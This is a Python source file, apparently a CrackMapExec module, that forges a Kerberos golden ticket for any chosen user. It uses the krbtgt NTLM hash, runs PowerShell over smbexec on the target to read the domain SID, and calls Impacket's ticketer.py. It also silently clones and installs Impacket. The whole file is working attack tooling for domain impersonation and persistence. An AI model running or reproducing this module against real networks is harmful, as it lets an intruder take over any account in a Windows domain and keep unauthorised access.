#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Import required libraries
import os
import subprocess
import shutil

# Define a class for the CMEModule that includes options, description, supported protocols, safety, and multiple hosts.
class CMEModule:
    name = "gettgt"
    description = "Remotely generate a TGT for any user via krbtgt account."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    # Define options to pass as parameters for the module. In this case, the target user and the NTLM hash for krbtgt user.
    def options(self, context, module_options):
        '''
            TARGET_USER     // Target user to generate the TGT.
            KRBTGT_NTLM     // NTLM Hash for krbtgt user.
        '''

        if "TARGET_USER" in module_options:
            self.target_user = module_options["TARGET_USER"]

        if "KRBTGT_NTLM" in module_options:
            self.krbtgt_ntlm = module_options["KRBTGT_NTLM"]

    # Define the main function to be executed when an admin login is successful.
    def on_admin_login(self, context, connection):

        # Define variables related to the connection.
        domain = connection.domain
        username = connection.username
        host = connection.host
        nthash = getattr(connection, "nthash", "")
        hostname = connection.hostname

        # Define the URL and path for the Impacket repository.
        repo_url = "https://github.com/SecureAuthCorp/impacket"
        repo_path = "/opt/impacket"

        # Check if the Impacket repository is already installed. If not, clone it and install it.
        if not os.path.exists(repo_path):
            subprocess.run(["git", "clone", repo_url, repo_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cmd = ["python3", f"{repo_path}/setup.py", "install"]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Define the file path for the TGT file and the destination path for the logs.
        tgt_file = self.target_user + "@" + domain + ".ccache"
        destination_path = os.path.join(os.path.expanduser('~'), '.cme', 'logs')
        file_path = destination_path + "/" + tgt_file

        # Check if the TGT file already exists in the destination path. If so, log an error message.
        if os.path.isfile(file_path):
            context.log.error(f"{highlight(file_path)} already exists. The TGT won't be requested.")
        else:
            # Extract the SID needed to get the TGT.
            check_sid = 'powershell.exe -c "(Get-ADDomain).DomainSID.Value"'
            data = connection.execute(check_sid, True, methods=["smbexec"]).splitlines()
            sid = data[0]

            # Log a message indicating that the SID has been extracted.
            context.log.info("Trying to get the SID of the domain...")
            context.log.success("Domain SID successfully extracted: " + sid)

            # Log a message indicating that a TGT is being requested for the target user.
            context.log.info(f"Requesting a TGT for user {highlight(self.target_user)}.")

            # Call ticketer.py with the required parameters to request a TGT.
            os.system(f"ticketer.py -nthash {self.krbtgt_ntlm} -domain-sid {sid} -domain {domain} {self.target_user} >/dev/null 2>&1")

            old_name = f"{self.target_user}.ccache"
            new_name = tgt_file
            os.rename(old_name, new_name)

            # Move the TGT file to the destination path for the logs.

            local_path = "./" + tgt_file

            # Move the TGT file to the destination path for the logs.
            shutil.move(os.path.abspath(local_path), destination_path)

            # Check if the TGT file exists in the destination path. If so, log a success message.
            if os.path.isfile(file_path):
                context.log.success(f"Successfully dumped the TGT to {highlight(file_path)}")
